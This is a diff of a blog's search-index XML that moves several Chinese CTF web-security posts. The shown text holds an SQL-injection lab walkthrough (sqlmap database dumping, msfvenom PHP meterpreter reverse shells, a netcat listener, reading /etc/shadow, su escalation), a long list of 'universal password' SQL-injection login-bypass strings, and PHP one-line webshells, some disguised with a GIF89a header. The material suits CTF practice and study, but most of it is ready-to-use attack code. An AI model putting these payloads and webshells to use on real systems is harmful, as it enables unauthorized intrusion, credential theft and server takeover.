-    <url>/2024/09/11/3bc19a255208/</url>
-    <content><![CDATA[<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p><strong>SQL注入攻击指的是通过构建特殊的输入作为参数传入Web应用程序，而这些输入大都是SQL语法里的一些组合，通过执行SQL语句进而执行攻击者所要的操作，其主要原因是程序没有细致地过滤用户输入的数据，致使非法数据侵入系统。</strong></p>
-<p><strong>SQL注入的产生原因通常表现在以下几方面:①不当的类型处理;②不安全的数据库配置;③不合理的查询集处理;④不当的错误处理;⑤转义字符处理不合适;⑥多个提交处理不当。</strong></p>
-<h2 id="1-信息探测"><a href="#1-信息探测" class="headerlink" title="1.信息探测"></a>1.信息探测</h2><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -p- -T4 IP <span class="comment"># 探测端口</span></span><br><span class="line">namp -T4 -A -v IP <span class="comment"># 探测全部信息</span></span><br><span class="line">nikto -host http://ip:port</span><br></pre></td></tr></table></figure></div>
+    <title>万能登陆密码</title>
+    <url>/2024/09/11/d77af8045ce5/</url>
+    <content><![CDATA[<h1 id="绕过登陆常用万能密码"><a href="#绕过登陆常用万能密码" class="headerlink" title="绕过登陆常用万能密码"></a>绕过登陆常用万能密码</h1><p>所谓万能密码就是绕过登录验证直接进入管理员后台的密码，这种类型的密码可以通用到很多存在此漏洞的网站所以称之为万能。</p>
+<h3 id="asp-aspx万能密码"><a href="#asp-aspx万能密码" class="headerlink" title="asp aspx万能密码"></a>asp aspx万能密码</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1：&quot;or &quot;a&quot;=&quot;a</span><br><span class="line"></span><br><span class="line">2：&#x27;.).or.(&#x27;.a.&#x27;=&#x27;.a</span><br><span class="line"></span><br><span class="line">3：or 1=1--</span><br><span class="line"></span><br><span class="line">4：&#x27;or 1=1--</span><br><span class="line"></span><br><span class="line">5：a&#x27;or&#x27; 1=1--</span><br><span class="line"></span><br><span class="line">6：&quot;or 1=1--</span><br><span class="line"></span><br><span class="line">7：&#x27;or.&#x27;a.&#x27;=&#x27;a</span><br><span class="line"></span><br><span class="line">8：&quot;or&quot;=&quot;a&#x27;=&#x27;a</span><br><span class="line"></span><br><span class="line">9：&#x27;or&#x27;&#x27;=&#x27;</span><br><span class="line"></span><br><span class="line">10：&#x27;or&#x27;=&#x27;or&#x27;</span><br></pre></td></tr></table></figure></div>
 
-<h2 id="2-深入挖掘"><a href="#2-深入挖掘" class="headerlink" title="2.深入挖掘"></a>2.深入挖掘</h2><p>打开敏感页面 比如什么登录页面 &#x2F;admin&#x2F;login.php</p>
-<p>尝试弱口令登录，失败</p>
-<h2 id="3-漏洞扫描"><a href="#3-漏洞扫描" class="headerlink" title="3.漏洞扫描"></a>3.漏洞扫描</h2><blockquote>
-<p>web漏洞扫描器 owasp-zap<br>OWASP ZAP攻击代理服务器是世界上最受欢迎的免费安全工具之一。ZAP可以帮助您在开发和测试应用程序过程中，自动发现 Web应用程序中的安全漏洞。另外，它也是一款提供给具备丰富经验的渗透测试人员进行人工安全测试的优秀工具。</p>
-</blockquote>
-<p>输入ip进行attack，然后软件开始爬虫并扫描</p>
-<h2 id="4-漏洞利用"><a href="#4-漏洞利用" class="headerlink" title="4.漏洞利用"></a>4.漏洞利用</h2><h3 id="4-1-发现高危漏洞sql注入"><a href="#4-1-发现高危漏洞sql注入" class="headerlink" title="4.1 发现高危漏洞sql注入"></a>4.1 发现高危漏洞sql注入</h3><p>对扫描结果进行分析，发现高危漏洞SQL注入</p>
-<p>利用sqlmap利用SQL注入漏洞</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u url # 查看是否具有sql注入</span><br><span class="line">sqlmap -u url --dbs # 查看数据库名</span><br><span class="line">sqlmap -u url -D &quot;数据库名&quot; --tables # 查看对应数据库中的数据表</span><br><span class="line">sqlmap -u url -D &quot;数据库名&quot; -T &quot;表名&quot; --columns # 查看对应字段/列 </span><br><span class="line">sqlmap -u url -D &quot;数据库名&quot; -T &quot;表名&quot; -C &quot;列名&quot; --dump # 查看对应字段的值</span><br><span class="line">sqlmap -u url -os -shell #尝试直接获取shell</span><br><span class="line"># 注：所有的名称可以用 &quot;,&quot; 隔开以获取多个值</span><br></pre></td></tr></table></figure></div>
-
-<p>查找到对应的用户名和密码，登录系统</p>
-<p>上传shell反弹权限</p>
-<p>生成反弹shell</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp lhost=攻击机IP lport=未使用的端口 -f raw</span><br></pre></td></tr></table></figure></div>
-
-<p>将生成的shell保存到php文件中</p>
-<p>监听</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload linux/x86/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost 攻击机IP地址 </span><br><span class="line"><span class="built_in">set</span> lport 4444</span><br><span class="line">run</span><br></pre></td></tr></table></figure></div>
-
-<p>然后上传webshell，实现反弹，获取flag</p>
-<h3 id="4-2-未发现高危漏洞"><a href="#4-2-未发现高危漏洞" class="headerlink" title="4.2 未发现高危漏洞"></a>4.2 未发现高危漏洞</h3><p>但是通过前面的信息探测发现了登陆界面 如 &#x2F;phpmyadmin &#x2F;login.php 等</p>
-<p>然后尝试弱口令登录，无法登录，想到利用post sql注入</p>
-<h4 id="4-2-1-抓取数据包"><a href="#4-2-1-抓取数据包" class="headerlink" title="4.2.1 抓取数据包"></a>4.2.1 抓取数据包</h4><p>利用bp抓取网页数据包，注意设置浏览器代理，然后将抓取的数据包保存到request.raw文件里</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -r request.raw --level 5 --risk 3 --dbs --dbms mysql --batch</span><br><span class="line"># -r参数用于指定 SQLMap 工具所使用的 HTTP 请求文件</span><br><span class="line"># --level 5 表示最高级别的攻击。</span><br><span class="line"># --risk 3 表示非常高的风险。</span><br><span class="line"># --dbs: 这个选项表示 SQLMap 将尝试获取目标数据库的信息。</span><br><span class="line"># --dbms mysql: 这个选项指定了目标数据库管理系统的类型，这里是 MySQL。</span><br><span class="line"># --batch: 这个选项指定了在批处理模式下运行 SQLMap，即不需要用户交互。</span><br></pre></td></tr></table></figure></div>
+<p>admin’or 1&#x3D;1#</p>
+<h3 id="PHP万能密码"><a href="#PHP万能密码" class="headerlink" title="PHP万能密码"></a>PHP万能密码</h3><p>admin’&#x2F;*<br>密码*&#x2F;‘<br>‘or 1&#x3D;1&#x2F;*</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;or &quot;a&quot;=&quot;a</span><br><span class="line"></span><br><span class="line">&quot;or 1=1--</span><br><span class="line"></span><br><span class="line">&quot;or&quot;=&quot;</span><br><span class="line"></span><br><span class="line">&quot;or&quot;=&quot;a&#x27;=&#x27;a</span><br><span class="line"></span><br><span class="line">&quot;or1=1--</span><br><span class="line"></span><br><span class="line">&quot;or=or&quot;</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;or&#x27;=&#x27;or&#x27;</span><br><span class="line"></span><br><span class="line">&#x27;) or (&#x27;a&#x27;=&#x27;a</span><br><span class="line"></span><br><span class="line">&#x27;.).or.(&#x27;.a.&#x27;=&#x27;.a</span><br><span class="line"></span><br><span class="line">&#x27;or 1=1</span><br><span class="line"></span><br><span class="line">&#x27;or 1=1--</span><br><span class="line"></span><br><span class="line">&#x27;or 1=1/*</span><br><span class="line"></span><br><span class="line">&#x27;or&quot;=&quot;a&#x27;=&#x27;a</span><br><span class="line"></span><br><span class="line">&#x27;or&#x27; &#x27;1&#x27;=&#x27;1&#x27;</span><br><span class="line"></span><br><span class="line">&#x27;or&#x27;&#x27;=&#x27;</span><br><span class="line"></span><br><span class="line">&#x27;or&#x27;&#x27;=&#x27;&#x27;or&#x27;&#x27;=&#x27;</span><br><span class="line"></span><br><span class="line">&#x27;or&#x27;=&#x27;1&#x27;</span><br><span class="line"></span><br><span class="line">&#x27;or&#x27;=&#x27;or&#x27;</span><br><span class="line"></span><br><span class="line">&#x27;or.&#x27;a.&#x27;=&#x27;a</span><br><span class="line"></span><br><span class="line">&#x27;or1=1--</span><br><span class="line"></span><br><span class="line">1&#x27;or&#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span class="line">a&#x27;or&#x27; 1=1--</span><br><span class="line"></span><br><span class="line">a&#x27;or&#x27;1=1--</span><br><span class="line"></span><br><span class="line">or &#x27;a&#x27;=&#x27;a&#x27;</span><br><span class="line"></span><br><span class="line">or 1=1--</span><br><span class="line"></span><br><span class="line">or1=1--</span><br></pre></td></tr></table></figure></div>
 
 
 
-<h4 id="4-2-2-进行sql注入"><a href="#4-2-2-进行sql注入" class="headerlink" title="4.2.2 进行sql注入"></a>4.2.2 进行sql注入</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -r request.raw --level 5 --risk 3 -D wordpress8080 --tables --dbms mysql --batch</span><br></pre></td></tr></table></figure></div>
-
-
-
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -r request.raw --level 5 --risk 3 -D wordpress8080 -T users --columns --dbms mysql --batch</span><br></pre></td></tr></table></figure></div>
-
-
-
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -r request.raw --level 5 --risk 3 -D wordpress8080 -T users -C username,password --dbms mysql --batch</span><br></pre></td></tr></table></figure></div>
-
-
-
-<p>得到用户名和密码</p>
-<p>因为前面信息扫描出&#x2F;wordpress 目录，所以可以确定网站利用wordpress的CMS，然后wordpress的默认登录后台页面为</p>
-<p><code>/wordpress/wp-login.php</code></p>
-<p>输入用户名和密码，登陆后台。</p>
-<h4 id="4-2-3-反弹shell"><a href="#4-2-3-反弹shell" class="headerlink" title="4.2.3 反弹shell"></a>4.2.3 反弹shell</h4><p>然后也是上传webshell获得控制权</p>
-<p>利用自带的反弹shell</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cp</span> php-reverse-shell.php /root/Desktop/</span><br></pre></td></tr></table></figure></div>
-
-<p>然后将复制的shell进行修改，修改端口和ip为&#x3D;&#x3D;攻击机ip&#x3D;&#x3D;</p>
-<p>启动监听</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">nc -nlvp port <span class="comment">#对应的端口4444</span></span><br></pre></td></tr></table></figure></div>
-
-<p>访问上传webshell的地址(上传到404页面)</p>
-<p>&#x3D;&#x3D;http:&#x2F;&#x2F;靶场IP:port&#x2F;目录&#x2F;wp-content&#x2F;themes&#x2F;主题名&#x2F;404.php&#x3D;&#x3D;</p>
-<p>成功反弹</p>
-<p>然后优化终端</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure></div>
-
-<h4 id="4-2-4-提权"><a href="#4-2-4-提权" class="headerlink" title="4.2.4 提权"></a>4.2.4 提权</h4><p>查看敏感文件</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/shadow </span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /etc/passwd</span><br></pre></td></tr></table></figure></div>
-
-<p>利用su提权</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">su -root</span><br></pre></td></tr></table></figure></div>
-
-<p>发现空密码无法提权，然后尝试前面获取的密码（和后台密码相同）</p>
-<p>提权成功</p>
-<p>然后到&#x2F;root目录获取flag</p>
-<h2 id="5-X-Forward-For-sql注入"><a href="#5-X-Forward-For-sql注入" class="headerlink" title="5. X-Forward-For sql注入"></a>5. X-Forward-For sql注入</h2><h3 id="5-1-漏洞扫描"><a href="#5-1-漏洞扫描" class="headerlink" title="5.1 漏洞扫描"></a>5.1 漏洞扫描</h3><p>&#x3D;&#x3D;漏洞扫描器 AVWS&#x3D;&#x3D;</p>
-<p>扫描出X-Forwarded-For sql注入</p>
-<h3 id="5-2-漏洞利用"><a href="#5-2-漏洞利用" class="headerlink" title="5.2 漏洞利用"></a>5.2 漏洞利用</h3><p>利用sqlmap</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://靶场IP&quot; --header=&quot;X-Forwarded-For:*&quot; --dbs --batch</span><br></pre></td></tr></table></figure></div>
-
-
-
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://靶场IP&quot; --header=&quot;X-Forwarded-For:*&quot; -D &quot;photoblog&quot; --tables --batch</span><br></pre></td></tr></table></figure></div>
-
-
-
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://靶场IP&quot; --header=&quot;X-Forwarded-For:*&quot; -D &quot;photoblog&quot; -T &quot;users&quot; --columns --batch</span><br></pre></td></tr></table></figure></div>
-
-
-
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://靶场IP&quot; --header=&quot;X-Forwarded-For:*&quot; -D &quot;photoblog&quot; -T &quot;users&quot; -C &quot;login,password&quot; --dump --batch</span><br></pre></td></tr></table></figure></div>
-
-
-
-<p>成功获取用户名和密码，登录到后台</p>
 ]]></content>
       <categories>
-        <category>CTF</category>
-        <category>Web</category>
+        <category>common</category>
       </categories>
       <tags>
-        <tag>CTF</tag>
-        <tag>sql</tag>
+        <tag>common</tag>
       </tags>
   </entry>
   <entry>
@@ -1066,6 +1086,22 @@
       </tags>
   </entry>
   <entry>
+    <title>文件上传</title>
+    <url>/2024/09/11/776247657efa/</url>
+    <content><![CDATA[<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><p>一句话木马</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a? &lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>])&lt;/script&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>](<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>文件上传</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>服务器请求伪造（SSRF）</title>
     <url>/2024/09/11/fdbfb64754f6/</url>
     <content><![CDATA[<h1 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h1><h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p><strong>服务器请求</strong>是从客户端发起一个请求到服务器，服务器再向另外的服务器发起请求的过程。</p>
@@ -1126,22 +1162,6 @@
       </tags>
   </entry>
   <entry>
-    <title>文件上传</title>
-    <url>/2024/09/11/776247657efa/</url>
-    <content><![CDATA[<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><p>一句话木马</p>
-<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a? &lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>])&lt;/script&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>](<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
-
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>Web</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>文件上传</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>解决JNU某捷有线校园网关闭虚拟机网络服务</title>
     <url>/2024/09/21/7d3ba1c32839/</url>
     <content><![CDATA[<p><em><strong>免责声明：本文只作JNU锐捷校园网认证的经验分享，其他学校的校园网是否适用请自行尝试，所有后果与作者无关！</strong></em></p>
@@ -1197,26 +1217,6 @@
       <tags>
         <tag>common</tag>
         <tag>校园网</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>万能登陆密码</title>
-    <url>/2024/09/11/d77af8045ce5/</url>
-    <content><![CDATA[<h1 id="绕过登陆常用万能密码"><a href="#绕过登陆常用万能密码" class="headerlink" title="绕过登陆常用万能密码"></a>绕过登陆常用万能密码</h1><p>所谓万能密码就是绕过登录验证直接进入管理员后台的密码，这种类型的密码可以通用到很多存在此漏洞的网站所以称之为万能。</p>
-<h3 id="asp-aspx万能密码"><a href="#asp-aspx万能密码" class="headerlink" title="asp aspx万能密码"></a>asp aspx万能密码</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1：&quot;or &quot;a&quot;=&quot;a</span><br><span class="line"></span><br><span class="line">2：&#x27;.).or.(&#x27;.a.&#x27;=&#x27;.a</span><br><span class="line"></span><br><span class="line">3：or 1=1--</span><br><span class="line"></span><br><span class="line">4：&#x27;or 1=1--</span><br><span class="line"></span><br><span class="line">5：a&#x27;or&#x27; 1=1--</span><br><span class="line"></span><br><span class="line">6：&quot;or 1=1--</span><br><span class="line"></span><br><span class="line">7：&#x27;or.&#x27;a.&#x27;=&#x27;a</span><br><span class="line"></span><br><span class="line">8：&quot;or&quot;=&quot;a&#x27;=&#x27;a</span><br><span class="line"></span><br><span class="line">9：&#x27;or&#x27;&#x27;=&#x27;</span><br><span class="line"></span><br><span class="line">10：&#x27;or&#x27;=&#x27;or&#x27;</span><br></pre></td></tr></table></figure></div>
-
-<p>admin’or 1&#x3D;1#</p>
-<h3 id="PHP万能密码"><a href="#PHP万能密码" class="headerlink" title="PHP万能密码"></a>PHP万能密码</h3><p>admin’&#x2F;*<br>密码*&#x2F;‘<br>‘or 1&#x3D;1&#x2F;*</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;or &quot;a&quot;=&quot;a</span><br><span class="line"></span><br><span class="line">&quot;or 1=1--</span><br><span class="line"></span><br><span class="line">&quot;or&quot;=&quot;</span><br><span class="line"></span><br><span class="line">&quot;or&quot;=&quot;a&#x27;=&#x27;a</span><br><span class="line"></span><br><span class="line">&quot;or1=1--</span><br><span class="line"></span><br><span class="line">&quot;or=or&quot;</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;or&#x27;=&#x27;or&#x27;</span><br><span class="line"></span><br><span class="line">&#x27;) or (&#x27;a&#x27;=&#x27;a</span><br><span class="line"></span><br><span class="line">&#x27;.).or.(&#x27;.a.&#x27;=&#x27;.a</span><br><span class="line"></span><br><span class="line">&#x27;or 1=1</span><br><span class="line"></span><br><span class="line">&#x27;or 1=1--</span><br><span class="line"></span><br><span class="line">&#x27;or 1=1/*</span><br><span class="line"></span><br><span class="line">&#x27;or&quot;=&quot;a&#x27;=&#x27;a</span><br><span class="line"></span><br><span class="line">&#x27;or&#x27; &#x27;1&#x27;=&#x27;1&#x27;</span><br><span class="line"></span><br><span class="line">&#x27;or&#x27;&#x27;=&#x27;</span><br><span class="line"></span><br><span class="line">&#x27;or&#x27;&#x27;=&#x27;&#x27;or&#x27;&#x27;=&#x27;</span><br><span class="line"></span><br><span class="line">&#x27;or&#x27;=&#x27;1&#x27;</span><br><span class="line"></span><br><span class="line">&#x27;or&#x27;=&#x27;or&#x27;</span><br><span class="line"></span><br><span class="line">&#x27;or.&#x27;a.&#x27;=&#x27;a</span><br><span class="line"></span><br><span class="line">&#x27;or1=1--</span><br><span class="line"></span><br><span class="line">1&#x27;or&#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span class="line">a&#x27;or&#x27; 1=1--</span><br><span class="line"></span><br><span class="line">a&#x27;or&#x27;1=1--</span><br><span class="line"></span><br><span class="line">or &#x27;a&#x27;=&#x27;a&#x27;</span><br><span class="line"></span><br><span class="line">or 1=1--</span><br><span class="line"></span><br><span class="line">or1=1--</span><br></pre></td></tr></table></figure></div>
-
-
-
-]]></content>
-      <categories>
-        <category>common</category>
-      </categories>
-      <tags>
-        <tag>common</tag>
       </tags>
   </entry>
 </search>
